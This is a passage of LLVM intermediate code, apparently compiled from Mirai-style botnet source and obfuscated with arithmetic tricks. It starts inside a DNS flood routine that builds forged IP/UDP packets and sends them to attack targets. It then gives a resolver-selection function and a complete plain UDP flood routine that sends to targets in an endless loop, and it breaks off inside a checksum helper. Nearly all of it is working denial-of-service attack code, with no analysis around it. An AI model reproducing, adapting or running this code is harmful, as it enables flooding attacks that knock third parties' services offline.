  %366 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %367 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %366, i64 1
  %368 = bitcast %struct.dnshdr* %367 to i8*
  %369 = getelementptr inbounds i8, i8* %368, i64 1
  store i8* %369, i8** %36, align 8
  %370 = load i16, i16* %13, align 2
  %371 = zext i16 %370 to i32
  %372 = icmp eq i32 %371, 65535
  br i1 %372, label %373, label %386

; <label>:373:                                    ; preds = %352
  %374 = call i32 @rand_next()
  %375 = xor i32 %374, -1
  %376 = xor i32 65535, -1
  %377 = xor i32 1014152054, -1
  %378 = or i32 %375, %376
  %379 = or i32 1014152054, %377
  %380 = xor i32 %378, -1
  %381 = and i32 %380, %379
  %382 = and i32 %374, 65535
  %383 = trunc i32 %381 to i16
  %384 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 3
  store i16 %383, i16* %385, align 4
  br label %386

; <label>:386:                                    ; preds = %373, %352
  %387 = load i16, i16* %16, align 2
  %388 = zext i16 %387 to i32
  %389 = icmp eq i32 %388, 65535
  br i1 %389, label %390, label %399

; <label>:390:                                    ; preds = %386
  %391 = call i32 @rand_next()
  %392 = xor i32 65535, -1
  %393 = xor i32 %391, %392
  %394 = and i32 %393, %391
  %395 = and i32 %391, 65535
  %396 = trunc i32 %394 to i16
  %397 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %398 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %397, i32 0, i32 0
  store i16 %396, i16* %398, align 2
  br label %399

; <label>:399:                                    ; preds = %390, %386
  %400 = load i16, i16* %17, align 2
  %401 = zext i16 %400 to i32
  %402 = icmp eq i32 %401, 65535
  br i1 %402, label %403, label %416

; <label>:403:                                    ; preds = %399
  %404 = call i32 @rand_next()
  %405 = xor i32 %404, -1
  %406 = xor i32 65535, -1
  %407 = xor i32 1081907556, -1
  %408 = or i32 %405, %406
  %409 = or i32 1081907556, %407
  %410 = xor i32 %408, -1
  %411 = and i32 %410, %409
  %412 = and i32 %404, 65535
  %413 = trunc i32 %411 to i16
  %414 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %415 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %414, i32 0, i32 1
  store i16 %413, i16* %415, align 2
  br label %416

; <label>:416:                                    ; preds = %403, %399
  %417 = load i16, i16* %18, align 2
  %418 = zext i16 %417 to i32
  %419 = icmp eq i32 %418, 65535
  br i1 %419, label %420, label %433

; <label>:420:                                    ; preds = %416
  %421 = call i32 @rand_next()
  %422 = xor i32 %421, -1
  %423 = xor i32 65535, -1
  %424 = xor i32 -1749866513, -1
  %425 = or i32 %422, %423
  %426 = or i32 -1749866513, %424
  %427 = xor i32 %425, -1
  %428 = and i32 %427, %426
  %429 = and i32 %421, 65535
  %430 = trunc i32 %428 to i16
  %431 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %432 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %431, i32 0, i32 0
  store i16 %430, i16* %432, align 2
  br label %433

; <label>:433:                                    ; preds = %420, %416
  %434 = load i8*, i8** %36, align 8
  %435 = load i8, i8* %19, align 1
  %436 = zext i8 %435 to i32
  call void @rand_alpha_str(i8* %434, i32 %436)
  %437 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 7
  store i16 0, i16* %438, align 2
  %439 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %440 = bitcast %struct.iphdr* %439 to i16*
  %441 = call zeroext i16 @checksum_generic(i16* %440, i32 20)
  %442 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 7
  store i16 %441, i16* %443, align 2
  %444 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %445 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %444, i32 0, i32 3
  store i16 0, i16* %445, align 2
  %446 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %447 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %448 = bitcast %struct.udphdr* %447 to i8*
  %449 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %450 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %449, i32 0, i32 2
  %451 = load i16, i16* %450, align 2
  %452 = load i8, i8* %19, align 1
  %453 = zext i8 %452 to i64
  %454 = sub i64 0, %453
  %455 = sub i64 21, %454
  %456 = add i64 21, %453
  %457 = sub i64 %455, -4309305164503500686
  %458 = add i64 %457, 2
  %459 = add i64 %458, -4309305164503500686
  %460 = add i64 %455, 2
  %461 = load i32, i32* %21, align 4
  %462 = sext i32 %461 to i64
  %463 = sub i64 %459, 4318930027848213120
  %464 = add i64 %463, %462
  %465 = add i64 %464, 4318930027848213120
  %466 = add i64 %459, %462
  %467 = sub i64 0, 4
  %468 = sub i64 %465, %467
  %469 = add i64 %465, 4
  %470 = trunc i64 %468 to i32
  %471 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %446, i8* %448, i16 zeroext %451, i32 %470)
  %472 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %473 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %472, i32 0, i32 3
  store i16 %471, i16* %473, align 2
  %474 = load i32, i32* %22, align 4
  %475 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %476 = load i32, i32* %9, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %475, i64 %477
  %479 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i32 0, i32 0
  %480 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %479, i32 0, i32 2
  %481 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %480, i32 0, i32 0
  store i32 %474, i32* %481, align 4
  %482 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %483 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %482, i32 0, i32 1
  %484 = load i16, i16* %483, align 2
  %485 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %486 = load i32, i32* %9, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %485, i64 %487
  %489 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %488, i32 0, i32 0
  %490 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %489, i32 0, i32 1
  store i16 %484, i16* %490, align 2
  %491 = load i32, i32* %10, align 4
  %492 = load i8*, i8** %32, align 8
  %493 = load i8, i8* %19, align 1
  %494 = zext i8 %493 to i64
  %495 = sub i64 41, 622902510379189521
  %496 = add i64 %495, %494
  %497 = add i64 %496, 622902510379189521
  %498 = add i64 41, %494
  %499 = sub i64 %497, -4477048967185918125
  %500 = add i64 %499, 2
  %501 = add i64 %500, -4477048967185918125
  %502 = add i64 %497, 2
  %503 = load i32, i32* %21, align 4
  %504 = sext i32 %503 to i64
  %505 = sub i64 0, %501
  %506 = sub i64 0, %504
  %507 = add i64 %505, %506
  %508 = sub i64 0, %507
  %509 = add i64 %501, %504
  %510 = sub i64 0, 4
  %511 = sub i64 %508, %510
  %512 = add i64 %508, 4
  %513 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %514 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %515 = load i32, i32* %9, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i64 %516
  %518 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %517, i32 0, i32 0
  %519 = bitcast %struct.sockaddr_in* %518 to %struct.sockaddr*
  store %struct.sockaddr* %519, %struct.sockaddr** %513, align 8
  %520 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %521 = load %struct.sockaddr*, %struct.sockaddr** %520, align 8
  %522 = call i64 @sendto(i32 %491, i8* %492, i64 %511, i32 16384, %struct.sockaddr* %521, i32 16)
  br label %523

; <label>:523:                                    ; preds = %433
  %524 = load i32, i32* %9, align 4
  %525 = add i32 %524, -274704600
  %526 = add i32 %525, 1
  %527 = sub i32 %526, -274704600
  %528 = add nsw i32 %524, 1
  store i32 %527, i32* %9, align 4
  br label %347

; <label>:529:                                    ; preds = %347
  br label %346

; <label>:530:                                    ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 21, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 21)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %105

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 22)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 22, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %104

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %92, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %97

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %92

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %71, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %71, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 0, 1
  %68 = add i32 %66, %67
  %69 = sub nsw i32 %66, 1
  %70 = icmp eq i32 %65, %68
  br i1 %70, label %71, label %91

; <label>:71:                                     ; preds = %64, %60, %56
  %72 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %74 = load i32, i32* %4, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = sub i32 %77, 74529805
  %80 = sub i32 %79, %78
  %81 = add i32 %80, 74529805
  %82 = sub nsw i32 %77, %78
  call void @util_memcpy(i8* %72, i8* %76, i32 %81)
  %83 = load i32, i32* %6, align 4
  %84 = load i32, i32* %4, align 4
  %85 = sub i32 %83, -570246854
  %86 = sub i32 %85, %84
  %87 = add i32 %86, -570246854
  %88 = sub nsw i32 %83, %84
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %89
  store i8 0, i8* %90, align 1
  store i8 1, i8* %9, align 1
  br label %97

; <label>:91:                                     ; preds = %64
  br label %92

; <label>:92:                                     ; preds = %91, %49
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, 1
  %95 = sub i32 %93, %94
  %96 = add nsw i32 %93, 1
  store i32 %95, i32* %6, align 4
  br label %30

; <label>:97:                                     ; preds = %71, %30
  %98 = load i8, i8* %9, align 1
  %99 = icmp ne i8 %98, 0
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %97
  %101 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %102 = call i32 @inet_addr(i8* %101) #6
  store i32 %102, i32* %1, align 4
  br label %116

; <label>:103:                                    ; preds = %97
  br label %104

; <label>:104:                                    ; preds = %103, %15
  br label %105

; <label>:105:                                    ; preds = %104, %0
  %106 = call i32 @rand_next()
  %107 = urem i32 %106, 4
  switch i32 %107, label %116 [
    i32 0, label %108
    i32 1, label %110
    i32 2, label %112
    i32 3, label %114
  ]

; <label>:108:                                    ; preds = %105
  %109 = call i32 @htonl(i32 134744072) #7
  store i32 %109, i32* %1, align 4
  br label %116

; <label>:110:                                    ; preds = %105
  %111 = call i32 @htonl(i32 1246898730) #7
  store i32 %111, i32* %1, align 4
  br label %116

; <label>:112:                                    ; preds = %105
  %113 = call i32 @htonl(i32 1074151430) #7
  store i32 %113, i32* %1, align 4
  br label %116

; <label>:114:                                    ; preds = %105
  %115 = call i32 @htonl(i32 67240450) #7
  store i32 %115, i32* %1, align 4
  br label %116

; <label>:116:                                    ; preds = %114, %112, %110, %108, %105, %100
  %117 = load i32, i32* %1, align 4
  ret i32 %117
}

declare i32 @open(i8*, i32, ...) #4

declare i64 @read(i32, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %173, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %178

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 %132, 937538358
  %143 = add i32 %142, %141
  %144 = add i32 %143, 937538358
  %145 = add i32 %132, %141
  %146 = call i32 @htonl(i32 %144) #7
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %125, %116
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 0
  %166 = bitcast %struct.sockaddr_in* %165 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %160, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @connect(i32 %159, %struct.sockaddr* %168, i32 16)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %154
  br label %172

; <label>:172:                                    ; preds = %171, %154
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = load i32, i32* %9, align 4
  %175 = sub i32 0, 1
  %176 = sub i32 %174, %175
  %177 = add nsw i32 %174, 1
  store i32 %176, i32* %9, align 4
  br label %58

; <label>:178:                                    ; preds = %58
  br label %179

; <label>:179:                                    ; preds = %214, %178
  store i32 0, i32* %9, align 4
  br label %180

; <label>:180:                                    ; preds = %207, %179
  %181 = load i32, i32* %9, align 4
  %182 = load i8, i8* %5, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp slt i32 %181, %183
  br i1 %184, label %185, label %214

; <label>:185:                                    ; preds = %180
  %186 = load i8**, i8*** %10, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  %190 = load i8*, i8** %189, align 8
  store i8* %190, i8** %22, align 8
  %191 = load i8, i8* %15, align 1
  %192 = icmp ne i8 %191, 0
  br i1 %192, label %193, label %197

; <label>:193:                                    ; preds = %185
  %194 = load i8*, i8** %22, align 8
  %195 = load i16, i16* %14, align 2
  %196 = zext i16 %195 to i32
  call void @rand_str(i8* %194, i32 %196)
  br label %197

; <label>:197:                                    ; preds = %193, %185
  %198 = load i32*, i32** %11, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i32, i32* %198, i64 %200
  %202 = load i32, i32* %201, align 4
  %203 = load i8*, i8** %22, align 8
  %204 = load i16, i16* %14, align 2
  %205 = zext i16 %204 to i64
  %206 = call i64 @send(i32 %202, i8* %203, i64 %205, i32 16384)
  br label %207

; <label>:207:                                    ; preds = %197
  %208 = load i32, i32* %9, align 4
  %209 = sub i32 0, %208
  %210 = sub i32 0, 1
  %211 = add i32 %209, %210
  %212 = sub i32 0, %211
  %213 = add nsw i32 %208, 1
  store i32 %212, i32* %9, align 4
  br label %180

; <label>:214:                                    ; preds = %180
  br label %179
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %18, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %13
  %16 = sub i64 %14, %15
  %17 = add i64 %14, %13
  store i64 %16, i64* %5, align 8
  br label %18

; <label>:18:                                     ; preds = %9
  %19 = load i32, i32* %4, align 4
  %20 = add i32 %19, -375028861
  %21 = sub i32 %20, 2
  %22 = sub i32 %21, -375028861
  %23 = sub i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp eq i32 %25, 1
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = load i16, i16* %28, align 2
  %30 = trunc i16 %29 to i8
  %31 = sext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = xor i64 65535, -1
  %42 = xor i64 1060657152579849243, -1
  %43 = or i64 %40, %41
  %44 = or i64 1060657152579849243, %42
  %45 = xor i64 %43, -1
  %46 = and i64 %45, %44
  %47 = and i64 %39, 65535
  %48 = sub i64 %38, -863102952688756679
  %49 = add i64 %48, %46
  %50 = add i64 %49, -863102952688756679
  %51 = add i64 %38, %46
  store i64 %50, i64* %5, align 8
  %52 = load i64, i64* %5, align 8
  %53 = lshr i64 %52, 16
  %54 = load i64, i64* %5, align 8
  %55 = sub i64 0, %53
  %56 = sub i64 %54, %55
  %57 = add i64 %54, %53
  store i64 %56, i64* %5, align 8
  %58 = load i64, i64* %5, align 8
  %59 = xor i64 %58, -1
  %60 = and i64 -1, %59
